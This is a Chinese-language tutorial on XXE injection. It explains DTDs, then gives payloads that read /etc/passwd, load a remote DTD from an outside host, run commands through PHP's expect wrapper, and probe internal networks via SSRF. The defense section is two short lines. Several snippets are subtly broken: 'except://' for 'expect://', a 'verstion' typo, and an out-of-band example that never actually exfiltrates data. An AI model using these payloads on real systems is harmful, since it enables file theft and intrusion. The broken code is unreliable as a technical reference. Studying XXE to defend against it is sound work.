# XXE 

XXE（XML External Entity injection）

XML外部实体注入漏洞，如果XML文件在引用外部实体时候，可以沟通构造恶意内容，可以导致读取任意文件，命令执行和对内网的攻击，这就是XXE漏洞。

>XML
> 
>XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，
> 
>是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。

DTD

其中文档类型定义（DTD）是XXE漏洞的重点利用对象，DTD用来为XML文档定义语义约束。可以嵌入在XML文档中（内部声明），也可以独立的放在一个文件中（外部引用）。

DTD中一些重要的关键字包括：
- DOCTYPE（DTD的声明） 
- ENTITY（实体的声明） 
- SYSTEM、PUBLIC（外部资源申请）

>内部声明

```
<!DOCTYPE 根元素 [元素声明]>
```

>外部声明
```
<!DOCTYPE 根元素 SYSTEM "文件名">
```

外部引用可支持http、file等协议，不同的语言支持的协议不同，但存在一些通用的协议。例如

![](https://s21.ax1x.com/2024/04/25/pkPSDXQ.png)

>实际利用

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE note [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
 
<user><username>&xxe;</username><password>root</password></user>
```

## XXE漏洞

XXE漏洞就是XML外部实体注入。当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。

### XXE的危害1：任意文件读取

利用file、http协议，在DTD外部引用中注入，从而获取文件内容。任意文件读取有分为有回显和无回显两种。

#### 有回显

可以直接在DTD中读取文件内容，攻击者通过列目录、读文件，获取帐号密码后进一步攻击。

![](https://s21.ax1x.com/2024/04/25/pkPSfpT.png)

#### 无回显

如果没有回显的话可以把数据发送到远程服务器。

```
<?xml verstion="1.0" encoding="utf-8"?>
<!DOCTYPE a[
                <!ENTITY % f SYSTEM "http://www.m03.com/evil.dtd">
                 %f;
]>
<a>&b;</a>
$data = simplexml_load_string($xml);
print_r($data);
```

远程服务器的evil.dtd文件内容：

```
<!ENTITY b SYSTEM "file:///etc/passwd">
```

### XXE危害2：命令执行

php环境下，xml命令执行要求php装有expect扩展。而该扩展默认没有安装。

```
<?php
$xml = <<<EOF
<?xml version = "1.0"?>
<!DOCTYPE ANY [
    <!ENTITY f SYSTEM "except://ls">
]>
<x>&f;</x>
EOF;
$data = simplexml_load_string($xml);
print_r($data);
?>
```

### XXE危害3：内网探测/SSRF

由于xml实体注入攻击可以利用http://协议，也就是可以发起http请求。可以利用该请求去探查内网，进行SSRF攻击。

![](https://s21.ax1x.com/2024/04/25/pkPSqtx.png)

![](https://s21.ax1x.com/2024/04/25/pkPSLh6.png)

### XXE危害4：攻击内网网站

## XXE防御方法

1. 禁止使用DTD的外部声明
2. 对用户提交过来的XML数据进行过滤

